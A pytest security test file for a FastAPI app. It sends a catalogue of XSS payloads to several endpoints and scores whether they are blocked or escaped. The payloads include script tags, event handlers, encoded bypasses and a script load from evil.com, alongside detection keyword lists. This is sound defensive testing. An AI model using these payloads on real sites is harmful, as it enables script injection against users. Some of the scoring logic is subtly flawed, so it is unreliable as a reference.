"""
Comprehensive XSS Protection Testing
Advanced Cross-Site Scripting (XSS) attack simulation and protection validation
covering all XSS attack vectors including reflected, stored, and DOM-based XSS.
"""

import asyncio
import json
import logging
import os
import time
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import quote, unquote
from html import escape, unescape

import pytest
import httpx
from fastapi.testclient import TestClient
from bs4 import BeautifulSoup

# Import application components
from backend.api.main import app

logger = logging.getLogger(__name__)


@dataclass
class XSSPayload:
    """XSS attack payload definition."""
    name: str
    description: str
    payload: str
    attack_type: str
    expected_blocked: bool
    severity: str
    target_location: str
    encoding_type: Optional[str] = None


class XSSTestSuite:
    """
    Comprehensive XSS testing suite covering all major attack vectors
    from the OWASP XSS testing guide.
    """

    def __init__(self):
        """Initialize XSS test suite."""
        self.client = TestClient(app)
        self.test_results = []
        self.blocked_attacks = 0
        self.successful_attacks = 0

        # Define comprehensive XSS payloads
        self.xss_payloads = self._get_xss_payloads()

        # Test endpoints that might reflect or store user input
        self.test_endpoints = [
            {"method": "GET", "url": "/api/documents", "param": "search", "context": "query_param"},
            {"method": "POST", "url": "/api/rag/query", "param": "query", "context": "json_body"},
            {"method": "GET", "url": "/api/library/documents", "param": "filter", "context": "query_param"},
            {"method": "POST", "url": "/api/documents/upload", "param": "filename", "context": "form_data"},
            {"method": "GET", "url": "/", "param": "redirect", "context": "query_param"},
            {"method": "POST", "url": "/api/auth/login", "param": "username", "context": "json_body"},
        ]

    def _get_xss_payloads(self) -> List[XSSPayload]:
        """Get comprehensive list of XSS attack payloads."""
        return [
            # Basic Script Injection
            XSSPayload(
                name="basic_script_tag",
                description="Basic script tag injection",
                payload="<script>alert('XSS')</script>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            ),
            XSSPayload(
                name="javascript_protocol",
                description="JavaScript protocol injection",
                payload="javascript:alert('XSS')",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="url_href"
            ),
            XSSPayload(
                name="event_handler_injection",
                description="Event handler XSS",
                payload="<img src=x onerror=alert('XSS')>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_attribute"
            ),

            # Advanced Script Injection
            XSSPayload(
                name="script_src_injection",
                description="External script source injection",
                payload="<script src='http://evil.com/xss.js'></script>",
                attack_type="reflected",
                expected_blocked=True,
                severity="critical",
                target_location="html_content"
            ),
            XSSPayload(
                name="svg_script_injection",
                description="SVG-based script injection",
                payload="<svg onload=alert('XSS')>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            ),
            XSSPayload(
                name="iframe_injection",
                description="Iframe-based XSS",
                payload="<iframe src='javascript:alert(\"XSS\")'></iframe>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            ),

            # Encoding and Obfuscation
            XSSPayload(
                name="html_entity_encoded",
                description="HTML entity encoded XSS",
                payload="&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content",
                encoding_type="html_entities"
            ),
            XSSPayload(
                name="url_encoded_xss",
                description="URL encoded XSS",
                payload="%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="url_param",
                encoding_type="url"
            ),
            XSSPayload(
                name="double_encoded_xss",
                description="Double URL encoded XSS",
                payload="%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="url_param",
                encoding_type="double_url"
            ),
            XSSPayload(
                name="unicode_encoded_xss",
                description="Unicode encoded XSS",
                payload="\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="json_data",
                encoding_type="unicode"
            ),

            # Filter Bypass Techniques
            XSSPayload(
                name="script_tag_variations",
                description="Script tag with variations",
                payload="<ScRiPt>alert('XSS')</ScRiPt>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            ),
            XSSPayload(
                name="incomplete_script_tag",
                description="Incomplete script tag bypass",
                payload="<script>alert('XSS')",
                attack_type="reflected",
                expected_blocked=True,
                severity="medium",
                target_location="html_content"
            ),
            XSSPayload(
                name="comment_bypass",
                description="HTML comment bypass",
                payload="<!--<script>alert('XSS')</script>-->",
                attack_type="reflected",
                expected_blocked=True,
                severity="medium",
                target_location="html_content"
            ),
            XSSPayload(
                name="attribute_breaking",
                description="HTML attribute breaking",
                payload="\" onmouseover=\"alert('XSS')\"",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_attribute"
            ),

            # Context-Specific Injections
            XSSPayload(
                name="css_expression_injection",
                description="CSS expression injection",
                payload="expression(alert('XSS'))",
                attack_type="reflected",
                expected_blocked=True,
                severity="medium",
                target_location="css_property"
            ),
            XSSPayload(
                name="style_tag_injection",
                description="Style tag with JavaScript",
                payload="<style>@import 'javascript:alert(\"XSS\")';</style>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            ),
            XSSPayload(
                name="meta_refresh_injection",
                description="Meta refresh redirection",
                payload="<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
                attack_type="reflected",
                expected_blocked=True,
                severity="medium",
                target_location="html_head"
            ),

            # DOM-Based XSS Simulation
            XSSPayload(
                name="dom_location_hash",
                description="DOM-based via location.hash",
                payload="#<script>alert('XSS')</script>",
                attack_type="dom_based",
                expected_blocked=True,
                severity="high",
                target_location="url_fragment"
            ),
            XSSPayload(
                name="dom_document_write",
                description="DOM-based via document.write",
                payload="<script>document.write('<img src=x onerror=alert(\"XSS\")');</script>",
                attack_type="dom_based",
                expected_blocked=True,
                severity="high",
                target_location="javascript_context"
            ),

            # Advanced Bypass Techniques
            XSSPayload(
                name="null_byte_bypass",
                description="Null byte filter bypass",
                payload="<script>alert('XSS');</script>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            ),
            XSSPayload(
                name="newline_bypass",
                description="Newline character bypass",
                payload="<script>\nalert('XSS');\n</script>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            ),
            XSSPayload(
                name="tab_bypass",
                description="Tab character bypass",
                payload="<script\t>alert('XSS');</script>",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            ),

            # Stored XSS Simulation
            XSSPayload(
                name="stored_profile_xss",
                description="Stored XSS in user profile",
                payload="<script>alert('Stored XSS')</script>",
                attack_type="stored",
                expected_blocked=True,
                severity="critical",
                target_location="user_profile"
            ),
            XSSPayload(
                name="stored_comment_xss",
                description="Stored XSS in comments",
                payload="Great article! <script>alert('XSS')</script>",
                attack_type="stored",
                expected_blocked=True,
                severity="critical",
                target_location="user_comment"
            ),

            # Modern JavaScript Techniques
            XSSPayload(
                name="template_literal_injection",
                description="Template literal injection",
                payload="${alert('XSS')}",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="javascript_template"
            ),
            XSSPayload(
                name="fetch_api_injection",
                description="Fetch API injection",
                payload="fetch('javascript:alert(\"XSS\")')",
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="javascript_context"
            ),

            # Benign Test Cases (should NOT be blocked)
            XSSPayload(
                name="legitimate_html_content",
                description="Legitimate HTML content",
                payload="<b>Important Document</b>",
                attack_type="benign",
                expected_blocked=False,
                severity="none",
                target_location="html_content"
            ),
            XSSPayload(
                name="legitimate_search_query",
                description="Legitimate search with special chars",
                payload="C++ programming & software development",
                attack_type="benign",
                expected_blocked=False,
                severity="none",
                target_location="search_query"
            ),
            XSSPayload(
                name="legitimate_code_sample",
                description="Legitimate code sample",
                payload="function test() { return 'hello'; }",
                attack_type="benign",
                expected_blocked=False,
                severity="none",
                target_location="code_content"
            )
        ]

    async def test_endpoint_with_xss_payload(
        self,
        endpoint: Dict[str, str],
        payload: XSSPayload
    ) -> Dict[str, Any]:
        """Test a specific endpoint with an XSS payload."""

        test_start = time.time()
        result = {
            "endpoint": f"{endpoint['method']} {endpoint['url']}",
            "parameter": endpoint['param'],
            "context": endpoint['context'],
            "payload_name": payload.name,
            "payload": payload.payload,
            "attack_type": payload.attack_type,
            "severity": payload.severity,
            "expected_blocked": payload.expected_blocked,
            "actually_blocked": False,
            "response_time_ms": 0,
            "response_code": 0,
            "response_body": "",
            "security_headers_present": {},
            "content_type": "",
            "xss_reflected": False,
            "html_escaped": False,
            "content_security_policy": ""
        }

        try:
            # Prepare request based on method and context
            if endpoint['method'] == "GET":
                params = {endpoint['param']: payload.payload}
                response = self.client.get(endpoint['url'], params=params)

            elif endpoint['method'] == "POST":
                if endpoint['context'] == "json_body":
                    data = {endpoint['param']: payload.payload}
                    response = self.client.post(endpoint['url'], json=data)
                elif endpoint['context'] == "form_data":
                    data = {endpoint['param']: payload.payload}
                    response = self.client.post(endpoint['url'], data=data)
                else:
                    data = {endpoint['param']: payload.payload}
                    response = self.client.post(endpoint['url'], json=data)

            result["response_time_ms"] = (time.time() - test_start) * 1000
            result["response_code"] = response.status_code
            result["response_body"] = response.text[:1000]  # Limit response body size
            result["content_type"] = response.headers.get("content-type", "")

            # Check security headers
            security_headers = {
                "X-XSS-Protection": response.headers.get("X-XSS-Protection"),
                "X-Content-Type-Options": response.headers.get("X-Content-Type-Options"),
                "X-Frame-Options": response.headers.get("X-Frame-Options"),
                "Content-Security-Policy": response.headers.get("Content-Security-Policy"),
                "Strict-Transport-Security": response.headers.get("Strict-Transport-Security")
            }
            result["security_headers_present"] = {k: v for k, v in security_headers.items() if v}
            result["content_security_policy"] = security_headers.get("Content-Security-Policy", "")

            # Analyze response for XSS indicators
            result["xss_reflected"] = self._check_xss_reflection(response.text, payload.payload)
            result["html_escaped"] = self._check_html_escaping(response.text, payload.payload)
            result["actually_blocked"] = self._is_xss_blocked(response, payload, result)

            # Log potential XSS vulnerabilities
            if result["xss_reflected"] and not result["actually_blocked"]:
                logger.warning(f"Potential XSS vulnerability: {payload.name} on {endpoint['url']}")
                logger.warning(f"Payload reflected: {payload.payload[:100]}")

        except Exception as e:
            result["response_body"] = str(e)
            result["actually_blocked"] = True  # Exception likely means blocked
            logger.error(f"Error testing {payload.name} on {endpoint['url']}: {e}")

        return result

    def _check_xss_reflection(self, response_text: str, payload: str) -> bool:
        """Check if XSS payload is reflected in the response."""

        # Check for exact payload reflection
        if payload.lower() in response_text.lower():
            return True

        # Check for partial payload reflection (key XSS components)
        xss_indicators = [
            "<script",
            "javascript:",
            "onerror=",
            "onload=",
            "alert(",
            "document.write",
            "eval("
        ]

        response_lower = response_text.lower()
        for indicator in xss_indicators:
            if indicator in payload.lower() and indicator in response_lower:
                return True

        return False

    def _check_html_escaping(self, response_text: str, payload: str) -> bool:
        """Check if HTML characters are properly escaped."""

        # Common HTML escaping patterns
        escaping_patterns = [
            ("<", "&lt;"),
            (">", "&gt;"),
            ("\"", "&quot;"),
            ("'", "&#x27;" or "&#39;"),
            ("&", "&amp;")
        ]

        for original, escaped in escaping_patterns:
            if original in payload and escaped in response_text:
                return True

        return False

    def _is_xss_blocked(self, response: httpx.Response, payload: XSSPayload, result: Dict[str, Any]) -> bool:
        """Determine if XSS attack was successfully blocked."""

        # Check for explicit rejection status codes
        if response.status_code in [400, 403, 422, 429]:
            return True

        # Check for server errors that might indicate blocking
        if response.status_code >= 500:
            return True

        # Check for security-related error messages
        response_text = response.text.lower()
        security_keywords = [
            'xss',
            'cross-site scripting',
            'invalid input',
            'security violation',
            'malicious content',
            'blocked',
            'forbidden',
            'suspicious script'
        ]

        if any(keyword in response_text for keyword in security_keywords):
            return True

        # Check Content Security Policy
        csp = response.headers.get("Content-Security-Policy", "")
        if csp and ("'none'" in csp or "'self'" in csp):
            # CSP present - provides some protection
            pass

        # Check X-XSS-Protection header
        xss_protection = response.headers.get("X-XSS-Protection", "")
        if xss_protection == "1; mode=block":
            # XSS protection enabled
            pass

        # For benign payloads, success responses indicate proper handling
        if payload.attack_type == "benign" and 200 <= response.status_code < 300:
            return False  # Benign content should not be blocked

        # Check if payload is reflected without escaping
        if result["xss_reflected"] and not result["html_escaped"]:
            # XSS payload reflected without proper escaping - potential vulnerability
            return False

        # Check for proper HTML escaping
        if result["html_escaped"]:
            return True  # Payload was escaped

        # If no reflection detected and no errors, assume blocked
        if not result["xss_reflected"]:
            return True

        # Default: assume potential vulnerability if payload reflected
        return False

    async def run_comprehensive_xss_tests(self) -> Dict[str, Any]:
        """Run comprehensive XSS tests against all endpoints."""
        logger.info("Starting comprehensive XSS protection testing")

        test_start_time = time.time()
        all_results = []

        # Test each payload against each endpoint
        for endpoint in self.test_endpoints:
            for payload in self.xss_payloads:
                result = await self.test_endpoint_with_xss_payload(endpoint, payload)
                all_results.append(result)

                # Update counters
                if payload.expected_blocked and result["actually_blocked"]:
                    self.blocked_attacks += 1
                elif not payload.expected_blocked and not result["actually_blocked"]:
                    self.blocked_attacks += 1  # Correctly handled benign content
                else:
                    self.successful_attacks += 1

        # Calculate statistics
        total_tests = len(all_results)
        protection_rate = (self.blocked_attacks / total_tests) * 100 if total_tests > 0 else 0

        # Categorize results by attack type
        attack_type_stats = {}
        for result in all_results:
            attack_type = result["attack_type"]
            if attack_type not in attack_type_stats:
                attack_type_stats[attack_type] = {"total": 0, "blocked": 0, "reflected": 0}

            attack_type_stats[attack_type]["total"] += 1
            if result["actually_blocked"] == result["expected_blocked"]:
                attack_type_stats[attack_type]["blocked"] += 1
            if result["xss_reflected"]:
                attack_type_stats[attack_type]["reflected"] += 1

        # Calculate protection rate by attack type
        for attack_type in attack_type_stats:
            stats = attack_type_stats[attack_type]
            stats["protection_rate"] = (stats["blocked"] / stats["total"]) * 100
            stats["reflection_rate"] = (stats["reflected"] / stats["total"]) * 100

        # Identify critical vulnerabilities (reflected XSS without blocking)
        critical_vulnerabilities = [
            result for result in all_results
            if (result["severity"] in ["critical", "high"] and
                result["xss_reflected"] and
                not result["actually_blocked"])
        ]

        # Security headers analysis
        security_headers_analysis = self._analyze_security_headers(all_results)

        test_summary = {
            "xss_test_summary": {
                "total_tests": total_tests,
                "attacks_blocked": self.blocked_attacks,
                "attacks_succeeded": self.successful_attacks,
                "overall_protection_rate": protection_rate,
                "test_duration_seconds": time.time() - test_start_time,
                "test_timestamp": datetime.utcnow().isoformat(),
                "attack_type_breakdown": attack_type_stats,
                "critical_vulnerabilities_count": len(critical_vulnerabilities),
                "endpoints_tested": len(self.test_endpoints),
                "payloads_tested": len(self.xss_payloads),
                "security_headers_analysis": security_headers_analysis
            },
            "detailed_results": all_results,
            "critical_vulnerabilities": critical_vulnerabilities
        }

        return test_summary

    def _analyze_security_headers(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze security headers presence across all responses."""

        header_counts = {
            "X-XSS-Protection": 0,
            "X-Content-Type-Options": 0,
            "X-Frame-Options": 0,
            "Content-Security-Policy": 0,
            "Strict-Transport-Security": 0
        }

        csp_directives = {}

        for result in results:
            headers = result.get("security_headers_present", {})
            for header_name in header_counts:
                if header_name in headers:
                    header_counts[header_name] += 1

            # Analyze CSP directives
            csp = result.get("content_security_policy", "")
            if csp:
                directives = csp.split(";")
                for directive in directives:
                    directive = directive.strip()
                    if directive:
                        key = directive.split()[0] if directive.split() else directive
                        csp_directives[key] = csp_directives.get(key, 0) + 1

        total_responses = len(results)
        header_coverage = {
            header: (count / total_responses) * 100
            for header, count in header_counts.items()
        }

        return {
            "header_coverage_percentage": header_coverage,
            "csp_directive_usage": csp_directives,
            "total_responses_analyzed": total_responses
        }


@pytest.mark.asyncio
@pytest.mark.security
class TestXSSComprehensive:
    """Comprehensive XSS protection testing."""

    @pytest.fixture(autouse=True)
    async def setup_xss_test(self):
        """Set up XSS testing environment."""
        self.test_suite = XSSTestSuite()
        yield

    async def test_reflected_xss_protection(self):
        """Test protection against reflected XSS attacks."""
        logger.info("Testing reflected XSS protection")

        reflected_payloads = [p for p in self.test_suite.xss_payloads if p.attack_type == "reflected"]

        vulnerable_endpoints = []

        for payload in reflected_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_xss_payload(endpoint, payload)

                # Reflected XSS should be blocked
                if not result["actually_blocked"] and payload.expected_blocked:
                    vulnerable_endpoints.append(f"{payload.name} on {endpoint['url']}")

        assert len(vulnerable_endpoints) == 0, f"Reflected XSS vulnerabilities: {vulnerable_endpoints}"
        logger.info("Reflected XSS protection test PASSED")

    async def test_stored_xss_protection(self):
        """Test protection against stored XSS attacks."""
        logger.info("Testing stored XSS protection")

        stored_payloads = [p for p in self.test_suite.xss_payloads if p.attack_type == "stored"]

        for payload in stored_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_xss_payload(endpoint, payload)

                # Stored XSS should be blocked (critical)
                assert result["actually_blocked"], f"CRITICAL: Stored XSS not blocked: {payload.name} on {endpoint['url']}"

        logger.info("Stored XSS protection test PASSED")

    async def test_dom_based_xss_protection(self):
        """Test protection against DOM-based XSS attacks."""
        logger.info("Testing DOM-based XSS protection")

        dom_payloads = [p for p in self.test_suite.xss_payloads if p.attack_type == "dom_based"]

        for payload in dom_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_xss_payload(endpoint, payload)

                # DOM-based XSS should be blocked
                assert result["actually_blocked"], f"DOM-based XSS not blocked: {payload.name} on {endpoint['url']}"

        logger.info("DOM-based XSS protection test PASSED")

    async def test_encoding_bypass_protection(self):
        """Test protection against encoded XSS bypasses."""
        logger.info("Testing encoded XSS bypass protection")

        encoded_payloads = [p for p in self.test_suite.xss_payloads if p.encoding_type is not None]

        for payload in encoded_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_xss_payload(endpoint, payload)

                # Encoded XSS should be blocked
                assert result["actually_blocked"], f"Encoded XSS bypass: {payload.name} ({payload.encoding_type}) on {endpoint['url']}"

        logger.info("Encoded XSS bypass protection test PASSED")

    async def test_html_escaping_implementation(self):
        """Test proper HTML escaping implementation."""
        logger.info("Testing HTML escaping implementation")

        # Test specific HTML escaping scenarios
        html_payloads = [
            "<script>alert('test')</script>",
            "<img src=x onerror=alert('test')>",
            "javascript:alert('test')",
            "\" onmouseover=\"alert('test')\""
        ]

        properly_escaped_count = 0
        total_tests = 0

        for payload_text in html_payloads:
            payload = XSSPayload(
                name=f"escaping_test_{total_tests}",
                description="HTML escaping test",
                payload=payload_text,
                attack_type="reflected",
                expected_blocked=True,
                severity="high",
                target_location="html_content"
            )

            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_xss_payload(endpoint, payload)
                total_tests += 1

                if result["html_escaped"] or result["actually_blocked"]:
                    properly_escaped_count += 1

        escaping_rate = (properly_escaped_count / total_tests) * 100 if total_tests > 0 else 0

        # Require >90% proper escaping/blocking rate
        assert escaping_rate >= 90.0, f"HTML escaping rate too low: {escaping_rate:.1f}%"

        logger.info(f"HTML escaping implementation test PASSED (escaping rate: {escaping_rate:.1f}%)")

    async def test_security_headers_implementation(self):
        """Test implementation of XSS-related security headers."""
        logger.info("Testing security headers implementation")

        # Test a sample request to check headers
        response = self.test_suite.client.get("/api/system/health")

        # Check for essential security headers
        headers = response.headers

        # X-XSS-Protection should be present
        xss_protection = headers.get("X-XSS-Protection")
        if xss_protection:
            assert "1" in xss_protection, f"X-XSS-Protection header not properly set: {xss_protection}"

        # X-Content-Type-Options should prevent MIME sniffing
        content_type_options = headers.get("X-Content-Type-Options")
        if content_type_options:
            assert content_type_options == "nosniff", f"X-Content-Type-Options not set to nosniff: {content_type_options}"

        # X-Frame-Options should prevent clickjacking
        frame_options = headers.get("X-Frame-Options")
        if frame_options:
            assert frame_options in ["DENY", "SAMEORIGIN"], f"X-Frame-Options not properly set: {frame_options}"

        # Content Security Policy should be restrictive
        csp = headers.get("Content-Security-Policy")
        if csp:
            # Check for restrictive directives
            assert "'unsafe-inline'" not in csp, "CSP allows unsafe-inline scripts"
            assert "'unsafe-eval'" not in csp, "CSP allows unsafe-eval"

        logger.info("Security headers implementation test PASSED")

    async def test_benign_content_handling(self):
        """Test that benign content is not incorrectly blocked."""
        logger.info("Testing benign content handling")

        benign_payloads = [p for p in self.test_suite.xss_payloads if p.attack_type == "benign"]

        for payload in benign_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_xss_payload(endpoint, payload)

                # Benign content should NOT be blocked
                assert not result["actually_blocked"], f"Benign content incorrectly blocked: {payload.name} on {endpoint['url']}"

        logger.info("Benign content handling test PASSED")


@pytest.mark.asyncio
async def test_complete_xss_protection():
    """Run complete XSS protection test suite."""
    logger.info("Starting complete XSS protection testing")

    # Initialize test suite
    test_suite = XSSTestSuite()

    # Run comprehensive tests
    results = await test_suite.run_comprehensive_xss_tests()

    # Save detailed results
    results_file = "performance_results/xss_protection_test_results.json"
    os.makedirs(os.path.dirname(results_file), exist_ok=True)
    with open(results_file, 'w') as f:
        json.dump(results, f, indent=2)

    # Validate results
    summary = results["xss_test_summary"]

    # Require >95% protection rate
    assert summary["overall_protection_rate"] >= 95.0, f"XSS protection rate too low: {summary['overall_protection_rate']:.1f}%"

    # No critical vulnerabilities allowed
    assert summary["critical_vulnerabilities_count"] == 0, f"Critical XSS vulnerabilities found: {summary['critical_vulnerabilities_count']}"

    # Validate specific attack type protection
    for attack_type, stats in summary["attack_type_breakdown"].items():
        if attack_type != "benign":  # Benign content should pass through
            assert stats["protection_rate"] >= 90.0, f"Low protection rate for {attack_type}: {stats['protection_rate']:.1f}%"

            # Reflected XSS should have low reflection rate
            if attack_type == "reflected":
                assert stats["reflection_rate"] <= 10.0, f"High reflection rate for {attack_type}: {stats['reflection_rate']:.1f}%"

    # Check security headers coverage
    headers_analysis = summary["security_headers_analysis"]
    essential_headers = ["X-XSS-Protection", "X-Content-Type-Options", "X-Frame-Options"]

    for header in essential_headers:
        coverage = headers_analysis["header_coverage_percentage"].get(header, 0)
        if coverage > 0:  # If header is implemented, it should be consistent
            assert coverage >= 80.0, f"Inconsistent {header} implementation: {coverage:.1f}% coverage"

    logger.info(f"Complete XSS protection testing PASSED")
    logger.info(f"Protection rate: {summary['overall_protection_rate']:.1f}%")
    logger.info(f"Tests completed: {summary['total_tests']}")
    logger.info(f"Critical vulnerabilities: {summary['critical_vulnerabilities_count']}")
    logger.info(f"Results saved to: {results_file}")

    return results


if __name__ == "__main__":
    """Run XSS protection tests standalone."""
    import asyncio

    async def main():
        results = await test_complete_xss_protection()
        print(f"XSS Protection Rate: {results['xss_test_summary']['overall_protection_rate']:.1f}%")
        return results

    asyncio.run(main())